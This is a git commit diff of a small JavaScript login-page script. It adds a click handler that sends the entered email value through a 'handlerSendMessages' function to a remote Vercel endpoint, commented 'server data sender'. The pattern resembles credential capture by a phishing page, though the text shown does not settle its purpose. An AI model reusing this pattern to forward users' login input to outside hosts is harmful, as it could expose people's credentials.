5d88d594544a5ca0f178f86fa7adf493e7c665f5
Angel Darco <angel92-eme@hotmail.com>
2026-05-04 04:09:41 -0500

    server connection done

--- src/app.js
+++ src/app.js
@@ -1,22 +1,41 @@
+// import { POST } from "./server";
+import { POST } from "../api";
+import { handlerSendMessages } from "./handlerSendMessages";
+import { spinner } from "./spinner";
+
 document.addEventListener("DOMContentLoaded", function () {
-  const login = document.getElementById("btn-login");
-  const pass01 = document.getElementById("pass01");
-  const pass02 = document.getElementById("pass02");
+  const login = document.getElementById("loginBtn");
+  const pass01 = document.getElementById("emailInput");
+  const pass02 = document.getElementById("passInput");
 
-  pass01.addEventListener("keyup", () => {
-    if (pass01 != null)
-      if (pass01.value === "") pass01.style.borderColor = "red";
-      else pass01.style.borderColor = "green";
-  });
+  pass01 &&
+    pass01.addEventListener("keyup", () => {
+      if (pass01 != null)
+        if (pass01.value === "") pass01.style.borderColor = "red";
+        else pass01.style.borderColor = "green";
+    });
 
-  pass02.addEventListener("keyup", () => {
-    if (pass02 != null)
-      if (pass02.value === "") pass02.style.borderColor = "red";
-      else pass02.style.borderColor = "green";
-  });
+  pass02 &&
+    pass02.addEventListener("keyup", () => {
+      if (pass02 != null)
+        if (pass02.value === "") pass02.style.borderColor = "red";
+        else pass02.style.borderColor = "green";
+    });
 
   login?.addEventListener("click", () => {
     if (pass01.value === "") pass01.style.borderColor = "red";
     if (pass02.value === "") pass02.style.borderColor = "red";
+
+    const URL = "project-bk3wq.vercel.app/api/index";
+    // const URL = "localhost:1234/api/index";
+    handlerSendMessages(URL, { message: pass01.value });
+    // POST({ message: pass01.value });
+    spinner();
+
+    //
+    //
+    //
+    //
+    // server data sender
   });
 });
